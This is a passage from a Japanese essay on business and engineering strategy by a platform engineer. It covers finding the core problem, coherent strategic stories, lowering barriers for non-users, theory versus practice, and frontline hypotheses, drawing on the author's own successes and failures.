パイプラインの整備。監視基盤の構築。セキュリティポリシーの策定。ただ、本当の核心的な課題は、別のところにあった。「開発者がインフラを触るまでのリードタイムが長すぎる」。これが核心だった。どんなに優れた基盤があっても、開発者が使い始めるまでに2週間かかるなら、誰も使わない。だから、セルフサービス化を最優先にした。申請から環境構築までを30分に短縮した。すると、利用率が上がり、開発速度も上がり、プラットフォームチームへの信頼も高まった。1つの核心を解いたら、他の問題も動き始めた。これが、戦略だ。核心的な課題を見つける。解決策を見つける。実行する。もう1つ、私自身のプラットフォームエンジニアリングの経験を話そう。以前いたチームでは、コードの品質、テストのカバレッジ、ドキュメントの不足、レガシーシステムとの連携と、無数の課題があった。ただ、本当の核心的な課題は別のところにあった。「開発者がステージング環境を立てるのに2日かかる」。これが核心だった。インフラチームへの申請、承認待ち、手動でのセットアップ。ステージング環境が作れなければ、検証できない。検証できなければ、リリースできない。Terraformでインフラをコード化し、GitHubのPRをマージするだけで環境が立ち上がるようにした。30分で完了する。すると、リリース頻度が上がり、バグも減り、開発者体験も改善された。1つの核心を解いたら、他の問題も動き始めた。シンプルだが、簡単ではない。課題を見極めることは、選択だからだ。「これが最も重要だ」と決めることは、「他は優先しない」と決めることでもある。戦略会議を思い出そう。「売上を前年比130%にする」は核心的な課題ではない。売上を伸ばすことは結果であって、問題ではない。問題は、なぜ売上が伸びないのか、だ。競合が強いのか。商品が古いのか。チャネルが弱いのか。ブランドが知られていないのか。価格が高いのか。営業力が足りないのか。どれが核心なのか。どれを解決すれば、売上が伸びるのか。それを見極めることが、戦略の第一歩だ。しかし、私たちはそれをしない。見極めることは、責任を負うことだからだ。「これが核心だ」と言った人間は、それが間違っていた時、責任を取らなければならない。だから、誰も言わない。全部重要だと言う。全部やると言う。そして、何も解決しない。選択から逃げる方法は、もう1つある。パーパスやミッションに逃げ込むことだ。パーパスやミッションは、戦略ではない。パーパスとは、企業の存在意義だ。ミッションは、企業が果たすべき使命だ。どちらも重要だ。だが、戦略ではない。「世界中の人々に幸せを届ける」。美しいパーパスだ。では、どうやって届けるのか。それが戦略だ。パーパスは方向を示す。道を示すのは戦略だ。多くの企業が、パーパスを掲げて満足してしまう。具体的に何をするのかは、曖昧なままだ。これは、戦略の放棄だ。難しい選択から逃げているだけだ。これは事業側の話だけではない。技術側にも同じ罠がある。「技術負債をなくす」「きれいなアーキテクチャにする」「開発者体験を向上させる」。美しい技術パーパスだ。しかし、具体的にどの負債を、いつまでに、どうやって返すのか。何を「きれい」と定義し、どの部分から手をつけるのか。開発者体験のどの側面を、どの程度まで改善するのか。それが示されていなければ、技術パーパスもまた、戦略ではない。事業側であれ技術側であれ、パーパスごっこに陥りやすい。美しい言葉を掲げて、具体的な選択から逃げる。私自身、「解決可能な最重要課題」を1つだけ挙げろと言われると、考え込んでしまうことがある。なぜそれが「最重要」だと言えるのか。即答できない時、見極めができていないと気づく。戦略はストーリーであるここまで、戦略の「内容」について語ってきた。何を解決するか。どこに集中するか。これが内容だ。次は、戦略の「形」について考えよう。同じ内容でも、伝え方によって実行力が変わる。バラバラの施策として並べるか、一貫したストーリーとして語るか。この違いが、戦略の成否を分ける。良い戦略は、施策ではなくストーリーだ。ストーリーとは何か。物語だ。因果の連鎖だ。「AだからB、BだからC、CだからD」という流れだ。良い戦略は、この流れがある。個々の施策が、バラバラに存在するのではない。互いに補強し合っている。前の手が、次の手を可能にする。次の手が、前の手の効果を高める。プロダクト開発で考えてみよう。「このアーキテクチャにしたからこそ、新機能の実験が低コストで回せる」。「このモジュール分割をしておくから、将来の料金プランのバリエーションを増やせる」。「このAPIの設計にしたから、パートナー連携がスムーズにできる」。コードの書き方と、事業側の選択肢が、一本の物語になっているかどうか。技術的な決定が、事業の可能性を広げている。事業の方向性が、技術的な決定を正当化している。この双方向のつながりがあるかどうか。それが、技術戦略がストーリーになっているかどうかの分かれ目だ。逆に、悪い戦略には、ストーリーがない。「我々は、高品質な商品を、低価格で、迅速に提供します」。一見、良さそうだ。でも、これはストーリーではない。施策の羅列だ。高品質と低価格は矛盾する。高品質にはコストがかかり、低価格にするにはコストを削る。迅速さも、品質と矛盾することが多い。これらの施策は、互いに補強し合っていない。むしろ、打ち消し合っている。因果の連鎖がないから、実行できない。なぜ、こうなるのか。多くの場合、「あれもこれも」と欲張るからだ。高品質が欲しい。低価格だって欲しい。迅速さまで欲しい。全部欲しい。でも、全部は取れない。ストーリーを一貫させるには、「これ一本」が必要になる。何かを選び、何かを捨てる。この「これ一本」の考え方は、企業の戦略だけでなく、チームや個人にも当てはまる。私が特に強く感じるのは、専業性の強さだ。誤解のないように言えば、多角化がつねに悪いわけではない。あるプラットフォームチームは、CI/CDパイプラインの整備から始まり、監視基盤、セキュリティスキャン、開発者ポータルへと領域を広げた。別のチームは、Kubernetesクラスタの運用から、GitOpsの導入、Terraformによるインフラ管理、コスト最適化へと拡張した。これは成功した多角化だ。しかし、共通するのは、核となる強みから派生して広がったことだ。前者は「開発者体験の向上」を軸に広がった。後者は「セルフサービス化による開発者の自律性」を軸に広がった。つまり、多角化と専業性は二項対立ではない。「何を軸にするか」が明確かどうかが分かれ目だ。問題なのは、軸のない多角化だ。「他のチームがやっているから自分たちも」「とりあえずKubernetesを入れよう」。このタイプの多角化は、リソースを分散させ、どの領域も「そこそこ」にしてしまう。専業的なチームが強いのは、専業だからではない。1つのことを徹底的に掘り下げているからだ。多角化していても、軸が明確で、そこを徹底的に掘り下げているチームは強い。チームの話をしてきたが、これは個人のキャリアにも当てはまる。私は、エンジニアとして働いている。プログラミングができる。インフラも分かる。データベースも触れる。フロントエンドもできる。「フルスタックエンジニア」という肩書きを持っている。しかし、あるとき気づいた。私は、多くのことを「そこそこ」できる。ただ、何1つ「徹底的に」できない。専門性がない。深さがない。だから、代替可能だ。誰かが、私より少し上手にできる。常に、そういう誰かがいる。専業性。1つのことを、徹底的に掘る。それが、競争優位の源泉だ。もしあなたが「何でもそこそこできる人」なのであれば、それをどうポジショニングするのかも戦略だ。「何でも屋」として埋もれるのか、「事業と技術をつなぐ翻訳者」として立つのか。どちらを選ぶかは、「何をやらないか」の選択だ。翻訳者として立つなら、深い専門性を追求することは諦める。代わりに、異なる専門性を持つ人々の間を橋渡しする能力を磨く。これも戦略的な選択だ。私自身、この問いを自分に向けることがある。戦略を説明する時、ストーリーになっているか。キーワードの寄せ集めか。専業性があるのか、何でもそこそこなのか。流されてそうなっているだけではないか。答えは、いつも曖昧だ。明確に「できている」とは言えない。ただ、問い続けること自体に意味があると思っている。まだ顧客ではない人を見つけるあるとき、プラットフォームチームのダッシュボードを眺めていて、違和感を覚えた。利用者数が伸びていない。一方で、既存ユーザーからの機能要望は山のように来ている。私たちは、その要望に応え続けていた。新機能を追加した。ドキュメントを充実させた。既存ユーザーは喜んだ。しかし、利用者数は変わらなかった。何かがおかしい。ふと疑問が浮かんだ。「使っていない人は、なぜ使っていないのか」。私たちは、その問いを持っていなかった。ここまで、戦略の「何を」「どう」の話をしてきた。次は、「誰に」の話だ。戦略を考える時、私たちは既存の顧客ばかり見てしまう。「この機能がほしい」「ここが使いにくい」。フィードバックは大事だ。ただ、本当の成長機会は、別のところにあることが多い。本当の顧客は、まだ顧客ではない。「まだ顧客ではない人」とは、ただ「使っていない人」ではない。彼らは、その機能を必要としていないのではない。「高すぎる」「難しすぎる」「面倒くさすぎる」など、どこかでバリアに引っかかっている。価格のバリア。複雑さのバリア。心理的なバリア。面倒くささのバリア。どのバリアが最も高いのかを見極め、それを下げる。これが、潜在顧客へのアプローチだ。私が関わったあるプラットフォームエンジニアリングのプロジェクトでは、社内の開発者向けに整備したCI/CDパイプラインやKubernetesクラスタが、なかなか使われない問題があった。機能を追加しても、ドキュメントを増やしても、利用率は上がらなかった。調べてみると、問題は別のところにあった。「初期設定が面倒」。パイプラインの機能は十分だった。ただ、自分のプロジェクトに適用するには、YAMLを何十行も書き、権限設定を複数箇所で行う必要があった。これがバリアだった。テンプレートを用意し、3つの質問に答えるだけで初期設定が完了するCLIツールを作った。利用率は上がった。機能の問題でも、ドキュメントの問題でもなかった。面倒くささのバリアだった。別の例を挙げよう。ある組織で、SREチームの構築した本格的な開発者プラットフォームがあったとする。Kubernetesクラスタ、Terraformによるインフラ管理、Prometheusによる監視、ArgoCD によるGitOps。高機能で、クラウドネイティブな開発には必須の基盤だ。ただ、使いこなすにはKubernetesの知識が必要で、YAMLの書き方を理解し、GitOpsのワークフローに慣れなければならない。このプラットフォームの「まだ顧客ではない人」は誰か。入社したばかりの新人エンジニアだ。別チームから異動してきたバックエンドエンジニアだ。彼らも同じ課題を抱えている。「自分のアプリケーションを安定して動かしたい」という同じ「進歩」を求めている。ただ、学習コストが高すぎる。複雑すぎる。だから、ローカル環境や古いVMで我慢している。ここで、セルフサービスポータルが登場したとする。Webの画面でアプリ名と言語を選ぶだけ。裏側ではKubernetesが動いているが、ユーザーはそれを意識しなくていい。すると、今までプラットフォームを使っていなかった新人や他チームのエンジニアが、ユーザーになる。使っているうちに理解が深まり、もっと高度なカスタマイズがしたくなる。直接YAMLを書くようになる。「まだユーザーではない人」が、ユーザーになる。そして、成長とともにプラットフォームのパワーユーザーになる。重要なのは、「機能を削った劣化版」を作ることではない。「まだ顧客ではない人」が抱えているバリアを特定し、そのバリアを下げることだ。価格がバリアなら、価格を下げる。複雑さがバリアなら、シンプルにする。心理的なハードルがバリアなら、入口を低くする。どのバリアが最も高いかを見誤ると、的外れな施策になる。「まだ顧客ではない人」を見つけて、バリアを下げる。この視点は、開発のやり方そのものを変える。開発には2つのアプローチがある。1つは「押しつけ」型だ。上から降りてきた仕様をそのまま実装する。なぜこの機能が必要なのか。誰のどんな課題を解決するのか。それが見えないまま、言われた通りに作る。すると、何が起きるか。作ったものが使われない。ユーザーが喜ばない。現場のモチベーションが下がる。もう1つは「引き寄せ」型だ。ユーザーの「本当に欲しい進歩」を理解する。そこから逆算して、仕様を決める。機能がユーザーのニーズに「引き寄せられている」状態だ。「まだ顧客ではない人」を見つけ、彼らのバリアを理解し、そこから仕様を導く。これこそが、戦略と開発が噛み合っている状態だ。私自身、「まだ顧客ではない人」を見落としていることに気づくことがある。既存ユーザーの声ばかり聞いて、「まだ使っていない人」のことを考えていない。彼らは何を求めているのか。何がバリアになっているのか。この視点を持つだけで、見える景色が変わる。ここで、1つ問いを立てたい。「まだ顧客ではない人」を見つけるのは、誰の仕事だろうか。マーケティング部門の仕事だと思われがちだ。しかし、現場こそ、潜在顧客のバリアを理解できる独自の視点を持っている。セールスは「買わない理由」を知っている。CSは「使い続けない理由」を知っている。そしてエンジニアは、バリアの多くが技術的な問題であることを知っている。「設定が複雑すぎる」。これは技術で解決できる。「動作が遅すぎる」。これも技術で解決できる。「他のツールと連携できない」。これも技術で解決できる。マーケティング部門は「バリアがある」と気づくことはできる。だが、「そのバリアをどう下げるか」を具体的に設計できるのは、現場だ。ここまで読むと、「現場が重要だ」という話に聞こえる。確かにそうだ。ただ、もう1つ、見落としがちな点がある。現場が価値を発揮できるのは、ある条件が揃っている時だけだ。その条件とは、制約だ。制約がなければ、現場は潜在顧客について何も語れない。逆説的に聞こえるだろう。説明しよう。どういうことか。もしリソースに何の制約もなければ、「全部やればいい」で終わる。高速にする。簡単にする。安くする。連携できるようにする。全部やる。それで解決だ。でも、現実にはリソースは有限だ。時間も、人も、予算も。だから、「どのバリアを下げるか」を選ばなければならない。この「選ぶ」という行為において、現場の知見が活きる。エンジニアなら「このバリアを下げるには3ヶ月かかる。でも、こっちのバリアなら1週間で下げられる」と判断できる。セールスなら「このバリアを下げれば、商談の成約率が上がる」と判断できる。制約があるからこそ、優先順位が生まれる。優先順位があるからこそ、戦略が必要になる。制約こそが、現場の貢献を可能にしている。つまり、「まだ顧客ではない人」を見つけて、そのバリアを下げる方法を提案すること。これは、現場ができる最大の「事業への貢献」の1つだ。指示を待つだけの現場には、この貢献はできない。「誰が使っていないのか」「なぜ使っていないのか」「どうすれば使えるようになるのか」。そして、「限られたリソースで、どのバリアから下げるべきか」。この問いを持つ現場だけが、事業の成長に直接貢献できる。理論と実践の間でここまで、戦略について語ってきた。核心的な課題を見極めること。ストーリーとしての一貫性。専業性の強さ。「まだ顧客ではない人」という視点。これらの考え方は、理解できる。頭では分かる。しかし、1つ重要な疑問が残る。これらの考え方を、どう使えばいいのか。正直に言えば、私はエンジニアだ。設計パターンやアーキテクチャの本を何冊も読んできた。ドメイン駆動設計。クリーンアーキテクチャ。マイクロサービス。モジュラーモノリス。どれも「ソフトウェアをどう構造化するか」についての理論だ。複雑さをどう分割するか。変更をどう局所化するか。チーム間の依存をどう減らすか。これらの理論や仕組みについて、語ることはできる。だが、それを自分のプロジェクトに適用できるかは、別の話だ。どの理論が自分たちの状況に適用可能なのか。どのパターンが今の組織規模とスキルセットに合っているのか。それを判断するには、理論を超えた洞察が必要だ。理論を語れることと、戦略を立てられることは、別だ。ただ、「戦略を語れない」ことと「戦略を実行できない」ことは、同じだろうか。私は「戦略を語れ」と言っている。しかし、語れることと実行できることは別だ。美しい戦略を語れても、実行できなければ意味がない。逆に、言葉にできなくても、体で分かっている人もいる。私は、どちらだろうか。語れるけど実行できないのか。実行できるけど語れないのか。それとも、どちらもできていないのか。正直に言えば、分からない。理論は、現実を説明する。「なぜこうなったのか」を教えてくれる。しかし、「どうすればいいのか」は教えてくれない。マイクロサービスアーキテクチャは、システムを小さな独立したサービスに分割する手法だ。各チームが自分のサービスを独立してデプロイできる。大規模組織では強力だ。ただ、5人のチームで導入すべきか。サービス間の通信、障害の伝播、デバッグの難しさ。小さなチームには重荷になる。モノリスのままでいいのか。将来の拡張性は諦めるのか。ドメイン駆動設計は、複雑なビジネスロジックを「境界づけられたコンテキスト」で整理する手法だ。だが、今のプロジェクトは、本当にそこまで複雑か。学習コストに見合う複雑さがあるのか。それを判断するには、理論を超えた洞察が必要だ。理論は、説明する。しかし、処方箋は出さない。これは、理論の限界だ。いや、限界というより、理論というものの性質だ。理論は、世界を理解するためのツールだ。世界を変えるためのツールではない。理論には、必ず適用範囲がある。マイクロサービスは、組織がスケールしている時に有効だ。ただ、チームが小さい時は、むしろ足かせになる。クリーンアーキテクチャは、ビジネスロジックを外部依存から切り離す設計思想だ。データベースやフレームワークを後から差し替えられる。長期保守が前提のプロダクトでは有効だ。一方、3ヶ月で検証して捨てるプロトタイプでは、過剰投資になる。テスト駆動開発は、テストを先に書き、そのテストを通すコードを後から書く手法だ。仕様が明確な時に有効だ。けれど、何を作るか探索している段階では、テストが足かせになることもある。つまり、理論を使うには、まず「どの理論が適用可能か」を判断しなければならない。だが、それを判断するには、理論を超えた洞察が必要だ。これは、逆説だ。理論を使うために、理論を超えた何かが必要だ。その「何か」とは何か。経験だ。直感だ。センスだ。結局、理論は、センスの補助線に過ぎない。センスのある人が理論を使えば、より深く考えられる。一方、センスのない人は理論だけに頼っても、何もできない。では、センスはどう磨くのか。「経験を積め」では答えになっていない。私なりに考えた方法を3つ挙げる。第一に、「判断の言語化」を習慣にする。何かを決めた時、なぜその判断をしたのかを書き残す。1ヶ月後、3ヶ月後に振り返る。当時の判断は正しかったか。何を見落としていたか。この繰り返しが、判断の精度を上げる。第二に、「他者の判断を追体験する」。本を読む時、著者がなぜその結論に至ったかを考える。「自分ならどう判断したか」を先に考えてから、著者の結論を読む。このギャップが学びになる。成功事例だけでなく、失敗事例を読むことも重要だ。第三に、「小さな賭けを繰り返す」。大きな戦略を立てる機会は少ない。ただ、小さな判断は毎日ある。「このタスクを先にやるか、後にやるか」「この機能を入れるか、外すか」。この小さな判断を意識的に行い、結果を観察する。センスは、大きな決断ではなく、小さな判断の積み重ねで磨かれる。センスは才能ではない、と私は思う。観察と振り返りの習慣なのではないか。私自身、この「センス」の不足を痛感したことがある。プラットフォームエンジニアとして「開発者体験を向上させるべきだ」と理論を実践しようとした。ツールのドキュメントを整備し、社内ドキュメントにまとめて共有した。ところが、利用率は変わらなかった。理論を機械的に適用したからだ。開発者体験は、ドキュメントだけでは向上しない。開発者が実際につまずく瞬間を観察する必要がある。「困ったらあの人に聞こう」と思われるプラットフォームチームが必要だ。これは信頼関係であり、組織文化だ。理論の外にある領域だが、理論を機能させるには不可欠だ。理論と実践の間には、常にギャップがある。理論は一般化された知識だ。実践は個別の状況だ。一般を個別に適用する翻訳こそが、実践者のスキルだ。だから、私は「この技術を使うべきか」と聞かれた時、即答しない。「チームの規模は」「プロダクトのフェーズは」「今の技術的負債はどこにある」と聞き返す。理論を適用する前に、文脈を理解しなければならない。文脈なき理論の適用は、害にすらなる。私はエンジニアだ。だから、目の前の現実と向き合うしかなかった。うまくいかないことを何度も経験した。その度に、なぜうまくいかなかったのかを考えた。理論を読み、現実と照らし合わせ、自分なりの理解を深めていった。この捻り出した思考は、今、個人やチームの戦略を立てる時に役立っている。理論を知っている。ただ、理論に頼りすぎない。現場を見る。人を見る。文脈を理解する。その状況に合った答えを探す。これが、実践者の仕事だ。小さな適応範囲なら、語れる。自分のチームで、どういう問題があって、どう解決しようとしたか。何がうまくいって、何がうまくいかなかったか。次はどうするか。この小さな範囲での試行錯誤が、戦略を立てる力を育てる。しかし、この「小さな適応範囲」の中には、純粋な技術領域だけでなく、事業寄りの判断もじわじわと入り込んでくる。「プロダクトのどこにリソースを割くか」「どの顧客セグメントに寄せるか」「この機能を今作るか、後で作るか」。これは、技術的な判断に見えて、実は事業の方向性に関わる判断だ。技術の現場にいながら、事業の戦略にも口を出すことになる。企業全体の戦略を立てることは、私にはできない。立場も違う。経験も足りない。だが、自分の責任範囲では、できる。自分のチームでは、できる。個人の仕事では、できる。この小さな範囲での実践こそが、本当の学びになる。理論を読むことは、重要だ。ただ、理論を読んだだけでは、何も変わらない。理論を使って、現場で試す。失敗する。振り返る。この繰り返しの中でしか、戦略を立てる力は身につかない。私自身、「戦略と言いながら、実は何も捨てていない」ものに関わってきた。理論やフレームワークを「そのまま」適用して、うまくいかなかったことも多い。足りなかったのは、現場の事情への理解だった。人の感情への配慮だった。技術戦略と事業戦略の距離を縮めるここまで、戦略を立てる「個人」の話をしてきた。だが、戦略は組織の中で機能する。特にエンジニアとして気になるのは、技術戦略と事業戦略の関係だ。長いあいだ、自分の中に「事業戦略→技術戦略」という一方向の矢印があった。事業側が「何を作るか」を決め、技術側は「どう作るか」を決める。経営が方向を決めて、エンジニアはそれを実装する。この一方向依存のメンタルモデルは、長らく私の中に染みついていた。しかし、現実には、「どう作るか」が「何ができるか」を大きく変える。変更コストの低いアーキテクチャだから、競合が半年かかる機能を1ヶ月で検証できる。このモジュールの切り方にしておくから、「この部分だけを切り出して別料金プランにする」という事業のオプションが生まれる。このAPIの設計にしておくから、将来のパートナー連携がスムーズにいく。技術戦略は、事業の選択肢を増やす。事業戦略から技術戦略への一方向ではなく、双方向の依存関係がある。技術が事業を制約することもあれば、技術が事業の可能性を広げることもある。この双方向性を理解すると、開発現場で起きる摩擦の見え方が変わる。技術的チャレンジは、想定外の遅延や不具合を生む。これを「技術の問題」として閉じてしまうと、現場は追い詰められる。「なんとかしろ」という圧力だけがかかる。しかし、技術的な課題を「事業戦略を動かす材料」として扱うと、話が変わる。「この技術的な制約があるなら、ローンチ時期をずらすか」。「このリスクがあるなら、この機能は一旦やめて、こっちの顧客セグメントを先に取るか」。技術の現場からの情報が、事業側の判断材料になる。不確実性を飼いならすための対話が生まれる。エンジニアだけでなく、デザイナー、PdM、ドメインエキスパートも同じだ。現場でプロダクトの手触りを一番知っている人たちが、事業戦略の「定数」ではなく「変数」をいじれる立場になっていい。「この仕様だとユーザーは混乱する」というデザイナーの声。「この機能は、実はこの顧客セグメントには刺さらない」というPdMの洞察。「この業界の慣習を考えると、この方向は難しい」というドメインエキスパートの知見。これは、事業戦略を修正するクリティカルなインプットだ。越権行為ではない。むしろ、健康な組織の姿だ。ここまで、技術と事業の対話について語ってきた。対話の相手は人間を想定してきた。しかし最近、対話の相手が変わりつつある。AIを戦略の壁打ち相手にする場面が増えた。試しにAIへ聞いてみたことがある。「戦略を考えてください」。出てきた答えは、驚くほど整っていた。SWOT分析。ファイブフォース分析。「デジタルチャネルの強化」「顧客体験の向上」といった施策。ロジックも通っている。これは、先ほど述べた「理論の限界」と同じ構造だ。AIは理論を適用できる。分析もできる。ただ、「どの理論が今の状況に適用可能か」を判断するのは、AIではなく人間だ。そして、最後に「これでいく」と賭けるのも人間だ。技術戦略と事業戦略の対話において、AIは優秀な壁打ち相手になる。「この技術的制約がある時、事業戦略はどう変わりうるか」と問えば、選択肢を整理してくれる。ただ、その選択肢の中からどれを選ぶかは、現場を知り、責任を負う人間が決める。これは、技術と事業の対話が人間同士であるべき理由と、根は同じだ。私自身、「本当はもっとこうすれば速く進めるのに」と感じることがある。技術の現場から見えている事業の可能性。それを戦略の議論にインプットしようとしたことはある。うまくいった時もあれば、スルーされた時もある。それでも、言い続けることに意味があると思っている。現場こそが仮説を持つべきだここまで、戦略について語ってきた。しかし、1つ疑問が残るだろう。現場の人間は、そもそも戦略なんて考える必要があるのか。与えられた目標を追いかけ、仕様通りに実装するのが仕事ではないのか。私の答えは明確だ。現場こそ、仮説を持つべきだ。エンジニアも、デザイナーも、セールスも、CSもだ。現場は、ビジネスの「手触り」を最も知っている立場だからだ。エンジニアは、プロダクトの構造的な手触りを知っている。「この機能は技術的に難しい」「ここがボトルネックになる」。これはコードを書く人間にしか分からない。同様に、セールスは顧客の「断る理由」の手触りを知っている。CSはユーザーが「つまづく瞬間」の手触りを知っている。本部で数字をこねくり回している時には見えない「事実の断片」を、現場は握っている。この手触りを「仮説」に昇華できた時、現場は戦略を変える力を持つ。たとえば、カスタマーサクセス（CS）。彼らは日々、「解約」という事実に直面する。戦略のないCSは、解約阻止のマニュアル通りに動き、ダメなら「顧客の事情」として処理する。しかし、仮説を持つCSは問う。「なぜ、このタイミングで解約するのか」。彼らは気づく。「機能不足ではなく、オンボーディングの3日目に発生する『設定の面倒さ』に心が折れているのではないか」。この仮説があれば、開発チームに「新機能より設定ウィザードの改善を」と要求できる。それは単なるクレーム処理ではない。立派な「チャーン（解約）阻止戦略」だ。たとえば、セールス。「価格が高いと言われました」と報告するだけなら、誰でもできる。AIでも集計できる。しかし、仮説を持つセールスは考える。「高いと言われるのは、価値が伝わっていないからか、それとも比較対象が間違っているからか」。もし顧客が、競合他社のツールではなく、Excelと比較して「高い」と言っているなら、戦い方は変わる。機能の多さをアピールするのではなく、「手入力のコスト」を訴求すべきだ。その気づきは、マーケティング戦略やプライシング戦略を根底から覆す可能性がある。仮説を持たない現場は、ただの「手足」になる。言われた通りに作り、言われた通りに売る。なぜやるのかは考えない。楽だが、キャリアとしては危うい。「言われたことを正確にやる」だけなら、代替可能だからだ。一方、仮説を持つ現場は、戦略の「センサー」になる。「本社が考えている戦略は、現場感覚とズレているぞ」と気づける。そのズレを言語化し、フィードバックする。時にそれは、経営陣にとって不都合な真実だろう。「今の売り方では絶対に売れない」「この機能は誰も使わない」。しかし、その不都合な真実こそが、組織を救う。仮説を持つことの有用性は、職種を問わず共通している。第一に、学習速度が上がる。仮説を持っていると、結果との差分が学びになる。「このトークなら刺さるはずだ」と思っていたことが、刺さらなかった。このギャップが、次の商談の精度を上げる。仮説がなければ、何が起きても「そんなものか」で終わる。第二に、議論に参加できる。仮説を持っていれば、それをぶつけることができる。「開発側はこう見ていますが、セールス側はどうですか」と問える。これは、単なる状況確認ではない。お互いの「手触り」を照らし合わせる行為だ。この対話の中で、事業の解像度が上がる。第三に、主体性が生まれる。仮説を持つと、「自分ごと」になる。この仮説が正しいかどうか、確かめたくなる。うまくいけば嬉しいし、間違っていれば悔しい。この感情が、仕事へのコミットメントを高める。私はエンジニアだ。だからコードを通じて事業を見る。セールスは対話を通じて、デザイナーは体験を通じて事業を見る。それぞれの「現場」からしか見えない景色がある。その景色を「仮説」という形にしてテーブルに乗せること。それが、私たちが戦略に参加する唯一の方法だ。現場は、戦略の「消費者」ではない。戦略の「参加者」になれる。そのためには、仮説を持つこと。問いを持つこと。それを声に出すこと。これが、現場と経営の距離、技術と事業の距離を縮める第一歩だ。戦略を語れ、責任を持ってここまで、戦略について長々と語ってきた。最後に、個人的な話をしたい。あの会議から、数年が経った。今も、お手伝いしてきた会社で、技術顧問として経営者たちと話をすることがある。会議で、誰かが「戦略」という言葉を使う。相変わらず、中身のない戦略が語られる。正直に言えば、私はそこで「それは戦略ですか」とは言えない。言えなかった。なぜなら、それは私の仕事の範疇を超えているからだ。技術顧問として呼ばれている。システムのアーキテクチャについて助言する立場だ。経営戦略に口を出すのは、越権行為だ。それでも、心のどこかで引っかかっている。本当に必要な場面であれば、立場を超えてでも言うべきではないのか。会社が明らかに間違った方向に進もうとしている時。誰も指摘しない時。そういう時こそ、言うべきではないのか。だが、言わない。言えない。その境界線がどこにあるのか、自分でもわからない。だから、内心では思っている。「その戦略で、どんな問題を解決するのか」。「その問題は、本当に最も重要な問題なのか」。「なぜ、その解決策なのか」。「他の選択肢は、検討したのか」。「何を捨てたのか」。これらの疑問が、頭の中を巡る。だが、口には出さない。出せない。立場が違う。責任の範囲が違う。その代わり、私は慎重に言葉を選ぶ。技術的な観点から、問いを投げかける。「その施策を実現するには、どんな技術的な課題がありますか」。「優先順位をつけるとしたら、どの順番で進めますか」。「リソースの制約を考えると、何かを諦める必要がありませんか」。気を使いながら、遠回しに。それでも、核心を突く問いを。これらの質問は、時に受け入れられる。時に、無視される。経営陣は、自分たちの「戦略」を語り続ける。ただ、不思議なことに、この経験が無駄になることはなかった。経営会議で言えなかったこと。内心で感じていたこと。絞り出した思考。気を使って口に出した言葉。すべて蓄積されていった。自分のチームを持った時、個人として仕事をする時、この経験が役に立った。エンジニアリングチームの方向性を決める時。技術的な選択をする時。プロジェクトの優先順位を決める時。そこでは、私は問うことができた。「この取り組みで、何を解決するのか」。「本当に、それが最も重要な課題なのか」。「なぜ、この方法なのか」。「他にやり方はないのか」。「何を捨てるのか」。チームメンバーと話す。一対一で。ホワイトボードの前で。Slackで。経営会議とは違う。ここでは、私が責任を持てる。私の範疇だ。だから、問える。そして、気づいた。戦略は、スケールの問題ではない。企業全体の戦略でも、チームの戦略でも、個人の戦略でも、根っこは同じだ。核心的な課題を見極める。解決策を見つける。何かを捨てる。実行する。経営会議で見てきた「戦略ごっこ」。あれを、自分のチームでは繰り返さない。そう決めた。チームの目標を立てる時。「全部やる」とは言わない。「これをやる。これはやらない」と明確にする。新しい技術を導入する時。「なんとなく良さそう」では進めない。「どの問題を解決するのか」を明確にする。プロジェクトの優先順位を決める時。「全部重要」とは言わない。「これが最重要。他は後回し」と決める。これは、不快だ。チームメンバーから反発されることもある。「なぜ、私のタスクは優先されないのか」。「なぜ、この技術は使わないのか」。それでも、説明する。なぜその判断をしたのか。何を最優先にしたのか。何を捨てたのか。時に、判断が間違っていることもある。やってみて、うまくいかない。その時は、認める。修正する。ただ、少なくとも、判断はしている。選択はしている。「全部やる」という逃げ方はしていない。これが、私なりの戦略だ。企業全体ではない。自分の責任範囲での戦略だ。それで十分だ。いや、それこそが核心だ。ただ、「小さな戦略で十分だ」と言っているが、それは「逃げ」ではないか。本当は、もっと大きな影響力を持ちたいのに、怖くて小さな範囲に留まっているだけだろう。「小さな戦略」という言葉で、自分の臆病さを正当化しているだけだろう。逆も考えられる。大きな戦略を語りたがる人の中には、目の前の小さな選択から逃げている人もいる。抽象的な「ビジョン」を語ることで、具体的な「何を捨てるか」から逃げている人。私は、少なくともそうはなりたくない。だから、小さな範囲でもいいから、選択し続ける。それが「逃げ」かどうかは、結果が教えてくれるだろう。戦略を立てるスキルは、3つの要素で形成される。第一に、本当に重要なものとそうでないものを見極める能力。第二に、その重要な問題が手持ちのリソースで解決可能かを判断する能力。第三に、リソースを集中投入する決断を下す能力。見極める。判断する。決断する。フレームワークでは学べない。理論でも教えられない。AIにも任せられない。では、どうやって身につけるのか。経験だ。失敗だ。振り返りだ。そして、自分の責任範囲で実践することだ。経営会議では言えなくても、自分のチームでは実践できる。そこで、何度も試す。何度も失敗する。何度も学ぶ。数年間、何度も失敗した。ある時、プラットフォームエンジニアとして、CI/CDパイプラインの刷新を提案した。分析は完璧だった。ビルド時間の短縮率も、デプロイ頻度の改善予測も計算した。しかし、導入されなかった。なぜなら、開発チームの理解が得られなかったからだ。彼らは、新しいパイプラインを信じていなかった。今のJenkinsで十分だと思っていた。彼らの視点を理解していなかった。だから、提案は受け入れられなかった。別の時、Kubernetesへの移行について相談された。コスト分析も、リスク分析も、移行計画も、調べて用意した。しかし、実行されなかった。なぜなら、組織がリスクを取れなかったからだ。今の運用で手一杯だった。新しい基盤に投資する余裕がなかった。組織の状況を理解していなかった。だから、提案は棚上げされた。自分のチームでも失敗した。開発者プラットフォームの改善プログラムを進めようとした。どこを改善すれば、どれだけ効果が出るか、細かく計算した。しかし、実行は中途半端に終わった。なぜなら、改善すべきものを明確にしなかったからだ。「全体的に改善しましょう」と言った。結果、誰もが「自分のところは変えなくていい」と思った。中途半端に変えて、効果も中途半端だった。選択する勇気がなかった。だから、失敗した。これらの失敗から、私は学んだ。戦略は、論理だけでは動かない。人を動かさなければならない。人を動かすには、彼らの視点を理解しなければならない。彼らの懸念を理解しなければならない。彼らの制約を理解しなければならない。戦略は、分析だけでは生まれない。判断が必要だ。「これが最重要だ」という判断。「これは捨てる」という判断。判断には、勇気が必要だ。間違うだろう恐怖と向き合う勇気が。戦略は、計画だけでは実現しない。実行が必要だ。実行には、コミットメントが必要だ。「これをやり遂げる」というコミットメント。困難に直面しても、諦めないコミットメント。論理。判断。コミットメント。この三つが揃って、初めて戦略は機能する。そして、これは、本を読むだけでは身につかない。理論を学ぶだけでは得られない。AIに聞いても教えてくれない。現場で、実際に戦略を作る。実行する。失敗する。振り返る。この繰り返しの